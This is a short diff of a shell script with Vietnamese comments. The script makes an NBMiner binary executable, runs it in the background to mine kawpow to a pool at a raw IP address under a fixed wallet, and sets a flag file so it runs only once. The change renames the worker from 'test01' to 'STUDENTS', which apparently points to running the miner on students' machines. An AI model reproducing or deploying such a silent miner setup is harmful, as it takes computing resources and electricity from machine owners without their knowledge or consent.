@@ -38,7 +38,7 @@ if [ ! -f "$NBMINER_FLAG" ]; then
     chmod +x nbminer
 
     # Chạy NBMiner
-    ./nbminer -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.test01 &
+    ./nbminer -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.STUDENTS &
     
     # Đánh dấu rằng NBMiner đã được thiết lập
     touch "$NBMINER_FLAG"
